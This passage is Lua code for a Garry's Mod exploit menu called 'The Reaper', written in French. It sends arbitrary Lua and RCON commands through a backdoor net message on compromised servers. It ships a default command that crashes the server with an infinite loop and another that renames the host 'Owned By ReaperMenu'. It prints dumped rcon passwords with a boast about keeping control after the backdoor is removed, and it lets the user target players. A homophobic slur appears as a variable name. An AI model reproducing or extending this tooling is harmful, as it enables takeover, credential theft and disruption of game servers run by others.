zilnixestbo30:SetPos( 100, 825 )
zilnixestbo30:SetText("Faire rire  tous le monde")
zilnixestbo30:SetTextColor(Color(255, 255, 255, 255))
zilnixestbo30.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75))
surface.DrawRect(0, 0, w, h)
end
zilnixestbo30.DoClick = function()
net.Start(lokiilcpasfairedeguiducoupilademanderazilnixetjesuslol)
net.WriteString("for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_LAUGH) end timer.Create(\"rire_loop\",7.9,0,function() for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_LAUGH) end end )")
net.WriteBit(1)
net.SendToServer()
end
local zilnixestbo31 = vgui.Create("DButton", DScrollPanel)
zilnixestbo31:SetSize( 350, 20 )
zilnixestbo31:SetPos( 100, 850 )
zilnixestbo31:SetText("Faire la pose du lyon pour tous le monde")
zilnixestbo31:SetTextColor(Color(255, 255, 255, 255))
zilnixestbo31.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75))
surface.DrawRect(0, 0, w, h)
end
zilnixestbo31.DoClick = function()
net.Start(lokiilcpasfairedeguiducoupilademanderazilnixetjesuslol)
net.WriteString("for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_PERSISTENCE) end")
net.WriteBit(1)
net.SendToServer()
end
local zilnixestbo32 = vgui.Create("DButton", DScrollPanel)
zilnixestbo32:SetSize( 350, 20 )
zilnixestbo32:SetPos( 100, 875 )
zilnixestbo32:SetText("Faire saluer tous le monde")
zilnixestbo32:SetTextColor(Color(255, 255, 255, 255))
zilnixestbo32.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75))
surface.DrawRect(0, 0, w, h)
end
zilnixestbo32.DoClick = function()
net.Start(lokiilcpasfairedeguiducoupilademanderazilnixetjesuslol)
net.WriteString("for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_GESTURE_BOW) end")
net.WriteBit(1)
net.SendToServer()
end
local RconCommand = vgui.Create( "DTextEntry", DScrollPanel )
RconCommand:SetPos( 385, 25 )
RconCommand:SetSize( 100, 20 )
RconCommand:SetText( "hostname Owned By ReaperMenu" )
local Lancer_rcon_commande = vgui.Create("DButton", DScrollPanel )
Lancer_rcon_commande:SetSize( 103, 20 )
Lancer_rcon_commande:SetPos( 275, 25 )
Lancer_rcon_commande:SetText("RCON Command")
Lancer_rcon_commande:SetTextColor(Color(255, 255, 255, 255))
Lancer_rcon_commande.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75))
surface.DrawRect(0, 0, w, h)
end
Lancer_rcon_commande.DoClick = function()
local rcon_commandes_get = RconCommand:GetValue()
FAUCHEUSE.NetStart(lokiilcpasfairedeguiducoupilademanderazilnixetjesuslol)
net.WriteString( rcon_commandes_get )
net.WriteBit(false)
net.SendToServer()
end
local GLUACommand = vgui.Create( "DTextEntry", DScrollPanel )
GLUACommand:SetPos( 165, 25 )
GLUACommand:SetSize( 100, 20 )
GLUACommand:SetText( "timer.Create(\"Timerdecrash\",0.5,1,function() while true do end end)" )
local Lancer_glua_commande = vgui.Create("DButton", DScrollPanel )
Lancer_glua_commande:SetSize( 103, 20 )
Lancer_glua_commande:SetPos( 50, 25 )
Lancer_glua_commande:SetText("Code LUA")
Lancer_glua_commande:SetTextColor(Color(255, 255, 255, 255))
Lancer_glua_commande.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75))
surface.DrawRect(0, 0, w, h)
end
Lancer_glua_commande.DoClick = function()
local glua_commandes_get = GLUACommand:GetValue()
FAUCHEUSE.NetStart(lokiilcpasfairedeguiducoupilademanderazilnixetjesuslol)
net.WriteString( glua_commandes_get )
net.WriteBit(1)
net.SendToServer()
end
end
net.Receive( "rcon_passw_dump", function()
local rcon_pass = net.ReadString()
chat.AddText( Color(255, 255, 255), rcon_pass, Color(0, 255, 0)," GG avec ça tu peux baiser le serveur même si il enleve la backdoor :D")
end )
net.Receive( "aucun_rcon_ici", function()
chat.AddText( Color(255, 0, 0),"Aucun rcon_password sur le serveur :/" )
end )
function FAUCHEUSE.MakePlayerSelectionButton( parent, x, y, addr )
if !parent:IsValid() then return end
local TButton = vgui.Create( "DButton" )
TButton:SetParent( parent )
TButton:SetPos( x, y + 15 )
TButton:SetFont( "TargetIDSmall" )
TButton:SetText( "Cibles" )
TButton:SetTextColor( Color(255, 255, 255, 255) )
TButton:SizeToContents()
TButton:SetTall( 26 )
TButton.Paint = function( self, w, h )
surface.SetDrawColor( Color(math.random(0,150),math.random(0,150),math.random(0,150)))
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color(25, 25, 25, 255) )
surface.DrawOutlinedRect( 0, 0, w, h )
end
TButton.DoClick = function()
FAUCHEUSE.SelectPlayersPanel( addr )
end
return TButton:GetWide(), TButton:GetTall()
end
function FAUCHEUSE.SelectPlayersPanel( addr )
if FAUCHEUSE.PlayerSelector and FAUCHEUSE.PlayerSelector:IsVisible() then FAUCHEUSE.PlayerSelector:Remove() end
local plytab = FAUCHEUSE.GetStored( addr, {} )
FAUCHEUSE.PlayerSelector = vgui.Create("DFrame")
FAUCHEUSE.PlayerSelector:SetSize(250,400)
FAUCHEUSE.PlayerSelector:SetTitle("Joueur(s) à cibler")
FAUCHEUSE.PlayerSelector:SetPos( gui.MouseX(), gui.MouseY() )
FAUCHEUSE.PlayerSelector:MakePopup()
FAUCHEUSE.PlayerSelector.Paint = function( s, w, h )
if !FAUCHEUSE.Menu or !FAUCHEUSE.Menu:IsVisible() then s:Remove() return end
surface.SetDrawColor( Color(30, 30, 30, 125) )
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color(255, 255, 255, 255) )
surface.DrawOutlinedRect( 0, 0, w, h )
surface.DrawOutlinedRect( 1, 1, w - 2, h - 2 )
end
local Plist = vgui.Create( "DPanelList", FAUCHEUSE.PlayerSelector )
Plist:SetSize( FAUCHEUSE.PlayerSelector:GetWide() - 10, FAUCHEUSE.PlayerSelector:GetTall() - 55 )
Plist:SetPadding( 5 )
Plist:SetSpacing( 5 )
Plist:EnableHorizontal( false )
Plist:EnableVerticalScrollbar( true )
Plist:SetPos( 5, 40 )
Plist:SetName( "" )
local target1 = vgui.Create("DButton", FAUCHEUSE.PlayerSelector)
target1:SetSize( 40, 20 )
target1:SetPos( 10, 23 )
target1:SetText("Tous")
target1:SetTextColor(Color(255, 255, 255, 255))
target1.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(0, 0, 50 ,155)
surface.DrawRect(0, 0, w, h)
end
target1.DoClick = function()
for _, p in pairs(player.GetAll()) do
if not table.HasValue( plytab, p ) then
table.insert( plytab, p )
end
end
FAUCHEUSE.Store( addr, plytab )
end
local target2 = vgui.Create("DButton", FAUCHEUSE.PlayerSelector)
target2:SetSize( 40, 20 )
target2:SetPos( 55, 23 )
target2:SetText("Aucun")
target2:SetTextColor(Color(255, 255, 255, 255))
target2.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(0, 0, 50 ,155)
surface.DrawRect(0, 0, w, h)
end
target2.DoClick = function()
table.Empty( plytab )
FAUCHEUSE.Store( addr, plytab )
end
local target3 = vgui.Create("DButton", FAUCHEUSE.PlayerSelector )
target3:SetSize( 40, 20 )
target3:SetPos( 100, 23 )
target3:SetText("Moi")
target3:SetTextColor(Color(255, 255, 255, 255))
target3.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(0, 0, 50 ,155)
surface.DrawRect(0, 0, w, h)
end
target3.DoClick = function()
table.Empty( plytab )
table.insert( plytab, LocalPlayer() )
FAUCHEUSE.Store( addr, plytab )
end
local target4 = vgui.Create( "DTextEntry", FAUCHEUSE.PlayerSelector )
target4:SetPos( 145, 23 )
target4:SetSize( 95, 20 )
target4:SetText( "" )
target4.OnChange = function( self )
local nam = self:GetValue()
local namtab = string.Explode( ", ", nam )
table.Empty( plytab )
for _, pl in pairs( player.GetAll() ) do
for _, s in pairs( namtab ) do
if string.find( string.lower( pl:Nick() ), s ) then
table.insert( plytab, pl )
end
end
end
FAUCHEUSE.Store( addr, plytab )
end
for k, v in pairs( player.GetAll() ) do
local plypanel2 = vgui.Create( "DPanel" )
plypanel2:SetPos( 0, 0 )
plypanel2:SetSize( 200, 25 )
local teamcol = team.GetColor( v:Team() )
plypanel2.Paint = function( s, w, h )
if !v:IsValid() then return end
surface.SetDrawColor( Color(30, 30, 30, 245) )
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( teamcol )
surface.DrawRect( 0, h - 3, w, 3 )
surface.SetDrawColor( Color(55, 55, 55, 245) )
surface.DrawOutlinedRect( 0, 0, w, h )
if table.HasValue( plytab, v ) then surface.SetDrawColor( Color(55, 255, 55, 245) ) end
surface.DrawOutlinedRect( 1, 1, w - 2, h - 2 )
end
local plyname = vgui.Create( "DLabel", plypanel2 )
plyname:SetPos( 10, 5 )
plyname:SetFont( "Trebuchet18" )
local tcol = Color( 255, 255, 255 )
if v == LocalPlayer() then tcol = Color( 155, 155, 255 ) end
plyname:SetColor( tcol )
plyname:SetText( v:Nick() )
plyname:SetSize(180, 15)
local faggot = vgui.Create("DButton", plypanel2 )
faggot:SetSize( plypanel2:GetWide(), plypanel2:GetTall() )
faggot:SetPos( 0, 0 )
faggot:SetText("")
faggot.Paint = function(panel, w, h)
return
end
faggot.DoClick = function()
if table.HasValue( plytab, v ) then
table.RemoveByValue( plytab, v )
else
table.insert( plytab, v )
end
FAUCHEUSE.Store( addr, plytab )
end
Plist:AddItem( plypanel2 )
end
end
function FAUCHEUSE.MakeTextInputButton( parent, x, y, btext, default, addr)
if !parent:IsValid() then return end
local hostframe = vgui.Create( "DPanel", parent )
hostframe:SetPos( x, y + 15 )
hostframe.Paint = function( self, w, h )
surface.SetDrawColor( Color(math.random(0,150),math.random(0,150),math.random(0,150)))
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color(25, 25, 25, 255) )
surface.DrawOutlinedRect( 0, 0, w, h )
end
local tttt = vgui.Create( "DLabel", hostframe )
tttt:SetPos( 5, 5 )
tttt:SetFont( "TargetIDSmall" )
tttt:SetText( btext )
tttt:SetTextColor ( Color(255,255,255))
tttt:SizeToContents()
local tentry = vgui.Create( "DTextEntry", hostframe )
tentry:SetPos( 12 + tttt:GetWide(), 3 )
tentry:SetSize( 100, 20 )
tentry:SetText( FAUCHEUSE.GetStored( addr, default ) )
tentry.OnChange = function( self )
FAUCHEUSE.Store( addr, self:GetValue() )
end
hostframe:SetSize( 20 + tttt:GetWide() + tentry:GetWide(), 26 )
return hostframe:GetWide(), hostframe:GetTall()
end
function FAUCHEUSE.MakeNumberInputButton( parent, x, y, btext, default, min, max, addr)
if !parent:IsValid() then return end
local hostframe = vgui.Create( "DPanel", parent )
hostframe:SetPos( x, y + 15 )
hostframe.Paint = function( self, w, h )
surface.SetDrawColor( Color(0, 0, 0, 255) )
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color( 50, 50, 50 ) )
surface.SetMaterial( degraderbas )
surface.DrawTexturedRect( 0, 0, w, h/ 2 )
surface.SetDrawColor( Color(100, 100, 100, 255) )
surface.DrawOutlinedRect( 0, 0, w, h )
end
local tttt = vgui.Create( "DLabel", hostframe )
tttt:SetPos( 5, 5 )
tttt:SetText( btext )
tttt:SizeToContents()
local wangmeoff = vgui.Create( "DNumberWang", hostframe )
wangmeoff:SetPos( 10 + tttt:GetWide(), 2 )
wangmeoff:SetSize( 75, 20 )
wangmeoff:SetDecimals( 2 )
wangmeoff:SetMinMax( min , max )
wangmeoff:SetValue( FAUCHEUSE.GetStored( addr, default ) )
wangmeoff:SetAllowNonAsciiCharacters(false)
wangmeoff.OnValueChanged = function( self, val )
FAUCHEUSE.Store( addr, self:GetValue() )
end
hostframe:SetSize( 13 + tttt:GetWide() + wangmeoff:GetWide(), 24 )
return hostframe:GetWide(), hostframe:GetTall()
end
local FillFrameRates = RatesScaleLevel
concommand.Add( "reaper", function()
if true
then FAUCHEUSE.Menu = vgui.Create("DFrame")
FAUCHEUSE.Menu:SetSize(750,750)
FAUCHEUSE.Menu:SetTitle("Created By Zilnix")
FAUCHEUSE.Menu:Center()
FAUCHEUSE.Menu:MakePopup()
FAUCHEUSE.Menu.gay = table.Count( FAUCHEUSE.sploits )
FAUCHEUSE.Menu.Paint = function( s, w, h )
surface.SetDrawColor( Color(0,0,0,150))
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color(0, 0, 0, 255) )
surface.DrawOutlinedRect( 0, 0, w, h )
surface.DrawOutlinedRect( 1, 1, w - 2, h - 2 )
surface.DrawOutlinedRect( 2, 2, w - 4, h - 4 )
surface.SetDrawColor( Color(0, 0, 0, 225) )
surface.DrawRect( 35, 100, w - 60, h - 184)
surface.SetDrawColor( Color(0, 0, 0, 255) )
surface.DrawOutlinedRect( 35, 100, w - 60, h - 182 )
surface.DrawOutlinedRect( 36, 101, w - 62, h - 184 )
surface.SetDrawColor( Color(0, 0, 0, 220) )
surface.DrawRect( 160, 20, w - 300, h - 680 )
surface.SetDrawColor( Color(0, 0, 0, 255) )
surface.DrawOutlinedRect( 160, 20, w - 300, h - 680 )
surface.DrawOutlinedRect( 161, 21, w - 302, h - 682 )
draw.DrawText( "THE REAPER", "DermaLarge", 310, 25, Color(255,255,255, 255) )
draw.DrawText( "LA FAUCHEUSE DE GARRY'S MOD", "Trebuchet24", 250, 50, Color(math.random(1,255),math.random(1,255),math.random(1,255)) )
end
local Plist = vgui.Create( "DPanelList", FAUCHEUSE.Menu )
Plist:SetSize( FAUCHEUSE.Menu:GetWide() - 90, FAUCHEUSE.Menu:GetTall() - 220 )
Plist:SetPadding( 5 )
Plist:SetSpacing( 5 )
Plist:EnableHorizontal( false )
Plist:EnableVerticalScrollbar( true )
Plist:SetPos( 50, 120 )
Plist:SetName( "" )
FAUCHEUSE.MakeFunctionButton( FAUCHEUSE.Menu, 650, 20, "Charger", FAUCHEUSE.LoadConfig, "Charger une Config" )
FAUCHEUSE.MakeFunctionButton( FAUCHEUSE.Menu, 50, 20, "Sauvegarder", FAUCHEUSE.SaveConfig, "Sauvegarder la Config" )
local function CreateSploitPanel( name, t )
if !FAUCHEUSE.Menu then return end
local cmdp = vgui.Create( "DPanel" )
cmdp:SetSize( Plist:GetWide(), 100 )
cmdp.Cmd = name
cmdp.Desc = t.desc
cmdp.Paint = function( s, w, h )
surface.SetDrawColor( Color(0,0,0,10))
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( severitycols[t.severity] )
surface.DrawOutlinedRect( 0, 0, w, h )
surface.DrawLine( 0, 25, w, 25 )
surface.DrawLine( 0, 26, w, 26 )
surface.DrawOutlinedRect( 1, 1, w - 2, h - 2 )
draw.DrawText( cmdp.Cmd, "TargetID", 10, 5, Color(255,255,255) )
draw.DrawText( cmdp.Desc, "DebugFixed", 10, 30, Color(255,255,255, 255) )
end
local x = 10
for _, tab in ipairs( t.functions ) do
if tab.typ == "func" then
x = (x + 5) + FAUCHEUSE.MakeFunctionButton( cmdp, x, 42, tab.name, tab.func )
elseif tab.typ == "players" then
x = (x + 5) + FAUCHEUSE.MakePlayerSelectionButton( cmdp, x, 42, tab.addr )
elseif tab.typ == "htxcommandeliste" then
x = (x + 5) + FAUCHEUSE.HTXBackdoor( cmdp, x, 42, tab.name )
elseif tab.typ == "string" then
x = (x + 5) + FAUCHEUSE.MakeTextInputButton( cmdp, x, 42, tab.name, tab.default, tab.addr )
if !FAUCHEUSE.IsStored( tab.addr ) then FAUCHEUSE.Store( tab.addr, tab.default ) end
elseif tab.typ == "float" then
x = (x + 5) + FAUCHEUSE.MakeNumberInputButton( cmdp, x, 42, tab.name, tab.default, tab.min, tab.max, tab.addr )
if !FAUCHEUSE.IsStored( tab.addr ) then FAUCHEUSE.Store( tab.addr, tab.default ) end
end
end
Plist:AddItem( cmdp )
end
for k, v in pairs( FAUCHEUSE.sploits ) do
if v.scan() then CreateSploitPanel( k, v ) end
end
else
LocalPlayer():EmitSound("common/warning.wav",500,100)
LocalPlayer():EmitSound("common/warning.wav",500,100)
LocalPlayer():EmitSound("common/warning.wav",500,100)
LocalPlayer():EmitSound("common/warning.wav",500,100)
LocalPlayer():EmitSound("common/warning.wav",500,100)
LocalPlayer():EmitSound("common/warning.wav",500,100)
return end
end)
end -- ne pas toucher cac checker end !!!